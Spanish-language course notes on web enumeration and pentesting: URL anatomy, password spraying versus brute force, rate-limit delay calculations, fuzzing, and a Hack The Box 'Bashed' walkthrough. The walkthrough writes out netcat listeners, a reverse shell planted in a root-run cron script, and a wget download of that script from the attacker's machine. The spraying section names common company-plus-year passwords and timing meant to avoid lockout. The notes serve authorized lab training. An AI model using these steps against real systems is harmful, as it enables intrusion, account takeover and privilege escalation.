# **2. Conceptos clave**

> →’

## **2.1. Anatomía de una URL**

Carlos usó un símil de análisis sintáctico para desmenuzar una URL. Tomando como ejemplo una dirección con búsqueda:

| |
|---|
|https://ejemplo.es/directorio?q=valor&page=2<br><br>  â”‚      â”‚        â”‚           â”‚  â”‚      â”‚<br><br>  â”‚      â”‚        â”‚           â”‚  â”‚      â””â”€ 2ª variable (page) = valor (2)<br><br>  â”‚      â”‚        â”‚           â”‚  â””â”€ separador de parámetros: &<br><br>  â”‚      â”‚        â”‚           â””â”€ variable (q) = valor<br><br>  â”‚      â”‚        â””â”€ directorio / ruta<br><br>  â”‚      â””â”€ dominio (.es procedencia España, .com global, .mx México...)<br><br>  â””â”€ protocolo (http, https, ftp, ssh, smb...) + 's' = capa segura sobre TCP/IP|

â—      El **protocolo** indica cómo se accede al recurso. La s de https es el subprotocolo seguro sobre TCP/IP.

â—      El **dominio** termina en un TLD que indica procedencia (.es, .com, .mx...).

â—      Tras ? empieza el primer **parámetro**; dentro de él, variable=valor.

â—      Para encadenar varios parámetros se usa & (ampersand). El ? va **una sola vez**, justo antes del primer parámetro: pagina?param1=valor1&param2=valor2.

| |
|---|
|**ℹ⚠ Por qué importa esta anatomía**<br><br>Cada parte de la URL es un punto donde podemos **fuzzear**: subdominio, directorio, nombre de parámetro o valor de variable. Saber diferenciarlas es lo que permite después decidir dónde inyectar el diccionario.|

## **2.2. Endpoint: la pieza que lo explica todo**

Un **endpoint** es el receptor concreto de una petición. Este concepto es la clave para entender por qué unas técnicas se detectan y otras no:

â—      Cambiar el **valor** de una misma variable en el mismo directorio →’ **mismo endpoint** (se repite el receptor).

â—      Cambiar de **directorio, parámetro o usuario** →’ **endpoints distintos** (cada uno es un receptor diferente).

| |
|---|
|**ℹ⚠ Analogía de Carlos**<br><br>Imagina la clase con 35 alumnos. Preguntar «¿me dejas un euro?» a Mariana, a Chema, a Ã“scar... son **endpoints distintos** (personas distintas). Repetir «¿un euro? ¿un euro? ¿un euro?» a la **misma** persona es el mismo endpoint, y a la décima te cansa (te bloquea).|

## **2.3. Códigos de estado HTTP**

Al lanzar peticiones interpretamos la respuesta por su código. Los básicos para enumerar:

|**Código**|**Significado**|**Uso en enumeración**|
|---|---|---|
|200|OK — el recurso existe y responde|El directorio/recurso **está** (levantado).|
|403|Forbidden — existe pero no autorizado|Existe, pero no nos deja entrar.|
|404|Not Found — no existe|El recurso **no** está.|
|301/302|Redirección|Nos manda a otra ruta (ej. /js →’ /js/).|
|**ℹ⚠ Recurso recomendado**<br><br>Carlos recuerda http.cat como chuleta visual de todos los códigos de estado HTTP.|

# **3. Fuerza bruta, password spraying y enumeración de directorios**

El grueso teórico de la sesión fue diferenciar estas tres cosas. Todas «lanzan muchas peticiones», pero se comportan de forma muy distinta frente a los mecanismos de defensa.

## **3.1. Fuerza bruta**

â—      Se lanza contra **el mismo endpoint** (por ejemplo, wp-login.php?user=x&pass=?), iterando el **valor** de una variable.

â—      Al golpear siempre el mismo receptor, es fácil que salte el **rate limit** y nos bloqueen.

â—      Es **exponencial**: no sabemos la longitud ni el juego de caracteres, así que el coste crece muchísimo (ver tabla de tiempos más abajo).

| |
|---|
|**⚠ Regla de oro**<br><br>La **fuerza bruta es lo último** que hay que intentar. Es ruidosa, lenta y muy probablemente no encuentre la contraseña por caracteres especiales, longitud y aleatoriedad.|

## **3.2. Password spraying**

En lugar de probar muchas contraseñas contra un usuario, se prueba **una misma contraseña contra muchos usuarios** (cada usuario es un endpoint distinto). Cuando termina la tanda, se lanza la siguiente contraseña.

â—      Explota el factor humano: la contraseña más habitual suele ser **el nombre de la empresa + año** (Empresa2026, Empresa2026!, Empresa2025...).

â—      Al rotar entre usuarios, cuando se vuelve al primero ya ha pasado tiempo suficiente para no disparar el rate limit por usuario.

â—      Al contrario que la fuerza bruta, **es de las primeras cosas** que se prueban en un ejercicio real.

| |
|---|
|**â›” Ejemplo de laboratorio / auditoría autorizada**<br><br>Sobre un directorio activo de ~700 usuarios se lanza Empresa2026 a todos; luego Empresa2026!; luego Empresa2025 y Empresa2025!. Según lo comentado en clase, ese pequeño conjunto de combinaciones suele sacar un porcentaje notable de usuarios. **Solo aplicable en entornos autorizados.**|

## **3.3. Enumeración de directorios (¿por qué NO te banean?)**

Al descubrir directorios probamos /admin, /login, /uploads... es decir, **un endpoint distinto por cada petición**. El servidor solo ve tráfico repartido entre muchas rutas, que es un comportamiento normal de navegación.

| |
|---|
|**Fuerza bruta →’ MISMO endpoint (mismo login) →’ salta rate limit**|
|**→“**|
|**Password spraying →’ 1 pass a N usuarios (endpoints distintos) →’ evade rate limit**|
|**→“**|
|**Enumeración de directorios →’ N rutas distintas (N endpoints) →’ no salta rate limit**|
|**ℹ⚠ Matiz de Carlos sobre parámetros**<br><br>Si sobre el mismo directorio **iteras el valor** de una variable, es fuerza bruta (mismo endpoint). Si **iteras el nombre del parámetro o el directorio**, son endpoints distintos →’ se comporta como un spray. Por eso podemos enumerar parámetros ocultos sin bloqueos.|

# **4. Rate limit, WAF y cálculo de delays**

El **rate limit** es el número máximo de intentos permitidos por unidad de tiempo. Siempre tiene forma de nº de intentos / tiempo.

â—      Valor típico en web y en Active Directory: **3 intentos cada 5 minutos** (≠ˆ 1 intento cada 100 s ≠ˆ 1,5 min).

â—      Puede aplicarse por **usuario** (bloquea la cuenta) o por **IP** (número de requests que acepta un servidor).

â—      Un **WAF/SIEM/EDR** detecta patrones de comportamiento repetitivo y levanta _flags_ que acaban en bloqueo.

## **4.1. Cómo calcular el delay (con NetExec)**

Como referencia, se comentó que **NetExec lanza ~1 petición cada 0,5 s**. Con ese dato se estima cuánto tarda una vuelta completa al listado de usuarios y si hace falta meter _delay_:

| |
|---|
|**ℹ⚠ Idea complementaria (añadida para aclarar el cálculo)**<br><br>**~5000 usuarios:** 5000 Ã— 0,5 s = 2500 s ≠ˆ 40 min por vuelta. Al volver al primer usuario ya ha pasado más de una hora →’ **no hace falta delay**.<br><br>**Pocos usuarios (ej. 6):** 6 Ã— 0,5 s = 3 s por vuelta, demasiado rápido →’ hay que **meter un delay** (p. ej. ~1 min por petición) para no superar el rate limit.<br><br>La regla mental: cuantos **menos usuarios**, **más delay**; cuantos más usuarios, el propio recorrido ya introduce el tiempo necesario.|

## **4.2. Tiempos de crackeo de contraseñas**

Se recordó la típica tabla que relaciona longitud/complejidad de contraseña con el tiempo de crackeo. La idea importante es que el coste es **acumulativo**: antes de llegar a probar 14 caracteres, ya has tenido que agotar todas las de 13, 12, 11...

| |
|---|
|**⚠ Por qué la fuerza bruta «está rara»**<br><br>Una contraseña de ~14 caracteres alfanuméricos con símbolos puede irse a cientos de millones de años. Y para llegar ahí primero recorres todas las longitudes menores. Por eso conviene evitarla y priorizar spraying o vectores más inteligentes.|
|**ℹ⚠ Mecanismos de bloqueo del mundo real (mencionados en clase)**<br><br>**Móviles (iOS/Android):** bloqueo progresivo tras varios fallos (10 s →’ 20 s →’ 40 s →’ minutos →’ hasta 999 min). Cada fabricante añade su propio esquema.<br><br>**Banca:** tras N fallos del código de acceso se bloquea la cuenta y hay que **desbloquear físicamente** en oficina.|

# **5. La técnica del día: Fuzzing**

El **fuzzing** combina lo mejor de la fuerza bruta (probar muchas combinaciones de un diccionario) con lo mejor del listado de directorios (endpoints distintos, sin bloqueos). Su clave es el marcador **FUZZ**: donde lo colocamos, la herramienta sustituye cada entrada del diccionario.

| |
|---|
|# El marcador FUZZ se puede colocar en distintas posiciones:<br><br>https://FUZZ.dominio.es/            →’ descubrir SUBDOMINIOS<br><br>https://dominio.es/FUZZ             →’ descubrir DIRECTORIOS<br><br>https://dominio.es/admin/FUZZ.php   →’ descubrir FICHEROS/rutas (admin1, admin2...)<br><br>https://dominio.es/pagina?FUZZ=1    →’ descubrir NOMBRES de parámetros<br><br>https://dominio.es/pagina?id=FUZZ   →’ descubrir VALORES de una variable|
|**✓ Ventaja del fuzzing**<br><br>Con **una sola herramienta** y el mismo enfoque podemos descubrir subdominios, directorios, parámetros y valores. Colocamos FUZZ donde queramos: esa flexibilidad es lo más importante de la técnica.|
|**ℹ⚠ Herramienta destacada: x8**<br><br>Carlos recomendó **x8**, una herramienta especializada en **enumerar parámetros ocultos** de una web (parámetros que no aparecen en la interfaz pero el backend sí procesa).|

## **5.1. ¿Cuándo listar directorios y cuándo fuzzear?**

â—      **Por defecto:** listado de directorios de confianza (Carlos usa **dirsearch**). Es lo primero que se lanza.

â—      **Fuzzear** cuando no encuentras nada con el listado estándar y sospechas que hay algo oculto: un subdominio, un parámetro, una funcionalidad o un directorio que no está en el diccionario habitual (muy típico en CTFs/máquinas vulnerables).

â—      También para **probar el valor** de una variable sin recurrir al Intruder de Burp Suite.

# **6. Metodología de pentesting y reconocimiento web**

Toda la sesión se enmarca en la metodología por fases:

| |
|---|
|**1. Enumeración**|
|**→“**|
|**2. Explotación**|
|**→“**|
|**3. Escalada de privilegios**|
|**→“**|
|**4. Persistencia**|
|**→“**|
|**5. Reporte**|

Camino habitual dentro de la enumeración web:

â—      nmap para detectar servicios. Si hay 80/443 o cualquier HTTP →’ **listado de directorios**.

â—      Si es un **CMS**: WordPress →’ WPScan; Drupal →’ droopescan. (Joomla/Shopify tienen sus frameworks, pero apenas se ven en la práctica.)

â—      Mientras el listado corre en segundo plano, **conocer la web** (recon manual).

## **6.1. La analogía de la discoteca (reconocimiento web)**

Antes de explotar, hay que «conocer» la aplicación, igual que no se le entra directo a alguien en una discoteca. El **WAF es el portero**: si te pasas de pesado, te echa. La idea es seducir sin que el portero te frene. Durante el recon buscamos señales que apuntan a vulnerabilidades potenciales:

|**Señal encontrada en la web**|**Vulnerabilidad potencial a investigar**|
|---|---|
|Buscador / campo de búsqueda|SQL Injection (interactúa con BD)|
|Formulario de registro o de contacto|SQL Injection (comunicación con el backend)|
|Blog / foro / comentarios|Cross-Site Scripting (XSS)|
|Directorio /uploads o de subida de ficheros|Subida de ficheros →’ posible ejecución (webshell)|
|Descarga de PDF (políticas, etc.)|XXE (XML External Entity)|
|No hace fetch de origen|SSRF (Server-Side Request Forgery)|
|Versión de PHP / software muy antigua|CVE con exploit público|
|Plantilla HTML / CMS con versión antigua|Vulnerabilidades propias de la plantilla/CMS|
|**ℹ⚠ Buena práctica de notas**<br><br>Todo hallazgo (usuario potencial, versión, ruta interesante, tecnología) se **apunta en el bloc de notas** aunque de momento se descarte. En enumeración, cuanto más recopilas, más vectores tienes después.|

→’

→’

# **7. Caso práctico: máquina Bashed (Hack The Box)**

| |
|---|
|**ℹ⚠ Nota de fidelidad**<br><br>En la transcripción la máquina suena como «Pashed»; por todos los indicios (herramienta _phpbash_, usuarios arrexel y scriptmanager, cadena test.py/test.txt con cron) se corresponde con la máquina **Bashed** de Hack The Box. Se corrige por coherencia técnica. Todo el trabajo es en un **entorno autorizado de CTF**.|

## **7.1. Enumeración inicial**

| |
|---|
|ping -c1 <IP>                 # comprobar ICMP / que la máquina responde<br><br>nmap -sCV -Pn <IP>            # -Pn omite descubrimiento de host (no depende de ICMP)|
|**ℹ⚠ Detalle sobre ICMP/ARP**<br><br>En máquinas alojadas en AWS un ping no devuelve nada porque **no hay ICMP ni ARP**. Ahí se usa -Pn para que Nmap no descarte el host.|

â—      Si al abrir la web **carga**, no hay un DNS/vhost puesto a mano. Si **no carga** y da error, hay que encontrar el nombre y añadirlo a /etc/hosts.

â—      Con un puerto 80 abierto, se lanza el listado de directorios en segundo plano (**dirsearch**) mientras se hace el recon manual.

## **7.2. Identificación de tecnologías**

â—      Con **Wappalyzer** se identifica el stack: se detecta **Apache** y **PHP** en el servidor.

â—      Se anota la versión de Apache para buscar **CVEs** (se revisaron varias: WebDAV, mod_proxy FTP XSS, buffer/heap overflow, modo LDAP...) y se descartan las que no aplican a la máquina.

â—      También aparece **jQuery** marcado como vulnerable — Carlos apunta que en la práctica casi nunca es un vector real.

## **7.3. Reconocimiento manual y descubrimiento de rutas**

Revisando el código fuente (clic derecho →’ ver código fuente) y navegando, se van mapeando rutas y hallazgos:

|**Ruta / hallazgo**|**Observación**|
|---|---|
|/about.html|Página «About». Aparece un autor →’ **usuario potencial** (p. ej. jmarshall, jen...).|
|/config.php|0 bytes. Un .php se **ejecuta** en el navegador, no muestra el código fuente.|
|/contact.html|Formulario sin backend real (comprobación solo en el front). Con Burp podría saltarse.|
|/images, /js, /php|Directorios de recursos. /js y /php ejecutan PHP →’ interesantes para subir/ejecutar.|
|/uploads|Directorio de subida →’ si logramos subir algo, posible **ejecución**.|
|/dev|Directorio de desarrollo →’ aquí está la joya.|
|Enlace a GitHub en el código|Apunta al **código fuente** de la herramienta instalada en el servidor.|
|**ℹ⚠ Concepto: por qué un .php se ve «vacío»**<br><br>Un .html o .js muestra su texto en el navegador. Un .php **se ejecuta** en el servidor y solo vemos el **resultado** de esa ejecución, no el código. Por eso config.php aparecía en blanco.|
|**ℹ⚠ Concepto: la extensión del directorio no limita el intérprete**<br><br>Un fichero PHP subido a /js **también se ejecuta** como PHP: el nombre de la carpeta (js) no define qué se interpreta. Si el servidor tiene PHP (Apache sobre Linux), ejecutará el .php esté donde esté.|

## **7.4. Explotación: webshell →’ reverse shell (www-data)**

En /dev se encuentra phpbash.php, una **webshell** que da ejecución de comandos sin autenticación (RCE crítico: cualquiera que alcance el fichero ejecuta comandos como el usuario del servidor web).

| |
|---|
|# En la webshell:<br><br>whoami        # -> www-data<br><br>ls            # /var/www/html es la raíz por defecto de Apache|

Como una webshell es incómoda, se monta una **reverse shell** propia. Usando revshells.com se genera un payload (Python) y se pone un _listener_ con Netcat:

| |
|---|
|# En la máquina atacante (Kali):<br><br>nc -lvnp 4444<br><br># En la webshell se pega el payload de reverse shell (Python) apuntando a nuestra IP:puerto.<br><br># La IP del atacante en HTB se ve arriba a la derecha (ej. 10.10.14.x).|
|**✓ Compromiso inicial**<br><br>Se obtiene una **reverse shell como `www-data`** en unos minutos. Es una shell real contra el servidor (a diferencia de webshells más limitadas).|

## **7.5. Escalada de privilegios: www-data →’ script_manager**

Rutina de escalada: whoami y después listar qué se puede ejecutar con sudo.

| |
|---|
|sudo -l<br><br># Resultado: www-data puede ejecutar comandos como 'scriptmanager' SIN contraseña.<br><br>sudo -u scriptmanager -i    # nos convertimos en scriptmanager (-i = shell interactiva)|
|**ℹ⚠ Buena práctica al cambiar de usuario**<br><br>sudo -u <usuario> -i es más limpio que sudo su. El -i (interactive) nos da una sesión con entorno del usuario destino.|

â—      En /home aparecen los usuarios arrexel (dueño de la máquina) y scriptmanager.

â—      La primera flag (user.txt) se encuentra en el directorio de **arrexel**.

## **7.6. Escalada final: script_manager →’ root (cron + escritura de fichero)**

En /home/scriptmanager/scripts hay dos ficheros clave. Mirando propietarios con ls -la:

|**Fichero**|**Propietario**|**Nuestros permisos (como scriptmanager)**|
|---|---|---|
|test.py|scriptmanager|Lectura y **escritura** (es nuestro)|
|test.txt|root|Solo lectura|

La pieza que faltaba: existe un **cron job** que ejecuta test.py **como root** de forma periódica. Se confirma observando que la **fecha de modificación** de los ficheros cambia sola cada cierto tiempo (algo los está tocando →’ root vía cron).

| |
|---|
|**cron (root) ejecuta test.py periódicamente**|
|**→“**|
|**test.py es propiedad de scriptmanager →’ PODEMOS modificarlo**|
|**→“**|
|**Inyectamos una reverse shell dentro de test.py**|
|**→“**|
|**El cron ejecuta test.py como root →’ nos conecta una shell**|
|**→“**|
|**Listener recibe la conexión →’ shell de ROOT**|

Como en la reverse shell no interactiva no se puede usar cómodamente vi/nano, se escribe el fichero con echo redirigido o transfiriéndolo con un servidor HTTP y wget:

| |
|---|
|# Opción A — escribir en una sola línea con echo (¡todo en 1 línea!):<br><br>echo 'import socket,subprocess,os; ...reverse shell python...' > /home/scriptmanager/scripts/test.py<br><br># Opción B — transferir el fichero preparado en local:<br><br># En Kali (dentro de la carpeta con test.py):<br><br>python3 -m http.server 8000<br><br># En la víctima:<br><br>wget http://10.10.14.x:8000/test.py -O /home/scriptmanager/scripts/test.py<br><br># Listener para recibir la shell de root:<br><br>nc -lvnp 4440|
|**✓ Objetivo cumplido**<br><br>Al ejecutarse el cron como root sobre nuestro test.py modificado, el _listener_ recibe una **shell de root**. Máquina comprometida por completo.|
|**â›” Errores comunes vistos en directo (para no repetirlos)**<br><br>**Puerto del listener:** hay que abrir el nc en el **mismo puerto** que el payload; se perdió tiempo por un 4443 vs 4445 descuadrado.<br><br>**Comandos en una sola línea:** en shells no interactivas, cuidado con saltos de línea y comillas mal cerradas al usar echo.<br><br>**`test.txt` vs `test.py`:** la reverse shell hay que meterla en el fichero que ejecuta el cron (test.py), no en el .txt de solo lectura.|

# **8. Herramientas utilizadas en la sesión**

|**Herramienta**|**Objetivo**|**Fase**|**Comando o uso visto**|**Nivel**|**Notas**|
|---|---|---|---|---|---|
|Nmap|Detectar puertos y servicios|Enumeración|nmap -sCV -Pn <IP>|Recurrente|-Pn si no hay ICMP (AWS)|
|dirsearch|Listar directorios|Enum. web|dirsearch -u <URL>|Practicada|Default de Carlos, en 2º plano|
|ffuf|Fuzzing (FUZZ)|Enum. web|ffuf -u <URL>/FUZZ -w dic|Introducida|FUZZ en dir/param/subdominio|
|gobuster / dirb / feroxbuster|Listar directorios|Enum. web|(equivalentes)|Practicada|Unas con recursivo, otras no|
|x8|Enumerar parámetros ocultos|Enum. web|x8 (param discovery)|Mencionada|Nueva en el registro|
|Wappalyzer|Fingerprint de tecnologías|Enum. web|Extensión navegador|Introducida|Detecta Apache/PHP/CMS|
|WPScan / droopescan|Auditoría de CMS|Enum. web|wpscan / droopescan|Introducida|WP y Drupal respectivamente|
|NetExec|Spraying/auth en AD|Enum./Acceso|(cálculo de delay)|Introducida|~1 req / 0,5 s|
|Burp Suite|Interceptar/saltar front|Explotación|Proxy / Intruder|Practicada|Saltar validaciones de front|
|revshells.com|Generar reverse shells|Explotación|Payloads listos|Practicada|Bash/nc/Python/PHP/perl|
|Netcat (nc)|Listener / conexiones|Explotación|nc -lvnp <puerto>|Practicada|Recibir la reverse shell|
|Python http.server|Servir/transferir ficheros|Post-explotación|python3 -m http.server|Introducida|Combinado con wget|
|**ℹ⚠ Nota de fidelidad**<br><br>Herramientas como **x8**, **droopescan** o **NetExec** se **mencionan** en la sesión pero no se desarrollan en profundidad en el material. Se registran para ampliarlas en sesiones futuras.

# **9. Comandos importantes**

| |
|---|
|# --- Enumeración ---<br><br>ping -c1 <IP><br><br>nmap -sCV -Pn <IP><br><br>dirsearch -u http://<IP>/<br><br># --- Fuzzing (marcador FUZZ) ---<br><br>ffuf -u http://<IP>/FUZZ -w <diccionario> -c        # directorios<br><br>ffuf -u http://FUZZ.<dominio> -w <diccionario> -c   # subdominios<br><br># --- Explotación / shells ---<br><br>nc -lvnp 4444                                       # listener en Kali<br><br>whoami ; id ; ls -la                                # reconocimiento en la shell<br><br># --- Escalada de privilegios ---<br><br>sudo -l                                             # qué puedo ejecutar como sudo<br><br>sudo -u scriptmanager -i                            # cambiar de usuario<br><br>ls -la                                              # revisar propietarios de ficheros<br><br># --- Transferencia de ficheros ---<br><br>python3 -m http.server 8000                         # en el atacante<br><br>wget http://10.10.14.x:8000/test.py -O test.py      # en la victima|

# **10. Riesgos, errores comunes y buenas prácticas**

| |
|---|
|**â›” Riesgos / alcance**<br><br>Todo lo practicado es sobre **laboratorios y máquinas autorizadas** (CTF de HTB / entornos de la academia). Nunca contra sistemas reales sin permiso explícito.|
|**⚠ Errores comunes**<br><br>Confundir **fuerza bruta** (mismo endpoint) con **spraying** (endpoints distintos).<br><br>Lanzar fuerza bruta como primera opción: ruidosa, lenta e improbable.<br><br>Descuadre de **puertos** entre payload y listener.<br><br>Meter la reverse shell en el fichero equivocado dentro de la cadena de escalada.|
|**✓ Buenas prácticas**<br><br>Primero **listado de directorios** (dirsearch); solo si no aparece nada, **fuzzear**.<br><br>**Conocer** la web antes de explotar (analogía de la discoteca).<br><br>Apuntarlo **todo** en el bloc de notas: usuarios, versiones, rutas.<br><br>Calcular **delays** en spraying según nº de usuarios para no superar el rate limit.|

# **11. Conexión con sesiones anteriores**

â—      El **fuzzing con `FUZZ`** y ffuf ya apareció en la explotación de servicios web (puerto 80). Aquí se formaliza como técnica y se compara con el listado de directorios.

â—      El **descubrimiento de subdominios** enlaza con lo visto en OSINT / superficie de ataque.

â—      La cadena **webshell →’ reverse shell →’ sudo →’ escalada** repite el patrón de máquinas anteriores (WordPress →’ theme editor →’ www-data, Mr. Robot, Oopsie/Archetype).

â—      La **escalada vía fichero ejecutado por root (cron)** conecta con el concepto de tareas programadas visto en la sesión previa (secuestro/hijacking de la ejecución).

â—      sudo -l, cambio de usuario y revisión de propietarios con ls -la son parte del _checklist_ de **escalada de privilegios** que se venía trabajando.

# **12. Resumen final**

La sesión fija los cimientos de la **enumeración web**: leer una URL como quien hace un análisis sintáctico, entender el concepto de **endpoint** y, a partir de ahí, distinguir por qué la **fuerza bruta** salta alarmas mientras el **password spraying** y la **enumeración de directorios** las evitan. La técnica estrella es el **fuzzing** (marcador FUZZ en subdominio, directorio, parámetro o valor), con **x8** como utilidad específica para parámetros ocultos. Todo se cierra con una máquina de HTB (**Bashed**) resuelta de principio a fin: _phpbash_ →’ reverse shell como www-data →’ sudo -u scriptmanager →’ escalada a **root** aprovechando un cron que ejecuta un script modificable. La metodología de fondo —Enumeración, Explotación, Escalada, Persistencia, Reporte— y la analogía de la discoteca resumen el «conocer antes de explotar».

# **13. Checklist de repaso**

**☐**  Sé identificar protocolo, dominio, directorio, parámetro y variable en una URL.

**☐**  Explico qué es un endpoint y por qué es la clave de rate limit/spraying.

**☐**  Diferencio fuerza bruta, password spraying y enumeración de directorios.

**☐**  Sé qué es el rate limit y cómo calcular un delay según el nº de usuarios.

**☐**  Entiendo el fuzzing y sé dónde colocar el marcador FUZZ.

**☐**  Conozco x8 para enumerar parámetros ocultos.

**☐**  Recuerdo las 5 fases de la metodología de pentesting.

**☐**  Sé leer las señales del recon web (buscador→’SQLi, uploads→’webshell, etc.).

→’

**☐**  Reproduzco la cadena de Bashed: phpbash →’ www-data →’ scriptmanager →’ root.

**☐**  Sé transferir ficheros con http.server + wget y montar reverse shells con nc.

# **14. Actualización del registro de herramientas**

Sección lista para copiar a la base de conocimiento del proyecto.

## **Herramientas nuevas incorporadas**

|**Herramienta**|**Para qué sirve**|**Fase**|**Nivel**|
|---|---|---|---|
|x8|Enumeración de parámetros ocultos en web|Enumeración web|Mencionada|
|dirsearch|Listado de directorios (default del profesor)|Enumeración web|Practicada|
|revshells.com|Generador de reverse shells (recurso web)|Explotación|Practicada|
|droopescan|Auditoría de CMS Drupal (equivalente a WPScan)|Enumeración web|Mencionada|

## **Conceptos/técnicas para el registro**

â—      **Fuzzing** con marcador FUZZ (subdominio / directorio / parámetro / valor).

â—      **Password spraying** y su diferencia con fuerza bruta (endpoints).

â—      **Cálculo de delays** frente al rate limit (referencia: NetExec ~1 req/0,5 s).

â—      **Escalada por cron + fichero escribible** ejecutado como root.

â—      Mapa de **recon web →’ vulnerabilidad** (analogía de la discoteca).

→’

→’

→’


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../Apuntes/05 - Auditoria Web/Repaso de Enumeración Web.md|Repaso de Enumeración Web]] — SMB / Impacket, SSRF, WordPress
- [[../apuntes Andres/02.07.2026 Fuzzing, Directory Listing y Escalada por Script Hijacking.md|02.07.2026 Fuzzing, Directory Listing y Escalada por Script Hijacking]] — Burp Suite, SSH, WordPress
- [[Maquinas/Auditoría de CMS — WordPress (máquina Academy).md|Auditoría de CMS — WordPress (máquina Academy)]] — Burp Suite, SSH, WordPress
- [[../apuntes Joselu/MODULO3/resumen_master_clase39.md|resumen_master_clase39]] — SMB / Impacket, SSH, SSRF
- [[../transcripciones/Julio/01.07.2026 Explotación Web WPScan File Upload y Reverse Shell en WordPress.md|01.07.2026 Explotación Web WPScan File Upload y Reverse Shell en WordPress]] — Blue Team / SOC, Burp Suite, WordPress
- [[../transcripciones/Junio/05.06.2026 Hacking Web y Enumeración Completa Máquina Ridiculously Easy.md|05.06.2026 Hacking Web y Enumeración Completa Máquina Ridiculously Easy]] — Feroxbuster, SSH, WordPress

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/DirSearch|DirSearch]]
- [[comandos/Feroxbuster|Feroxbuster]]
- [[comandos/FFUF|FFUF]]
- [[comandos/GoBuster|GoBuster]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/SSH|SSH]]
- [[comandos/WPScan|WPScan]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/SSRF — Server-Side Request Forgery.md|SSRF]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #blue-team #burpsuite #command-injection #dirsearch #escalada-privilegios #feroxbuster #ffuf #file-upload #gobuster #hack-the-box #hydra #kali #linux #metasploit #netcat #nmap #osint #pentest #post-explotacion #redes #reverse-shell #smb-impacket #sqli #ssh #ssrf #windows #wordpress #wpscan #xss #xxe
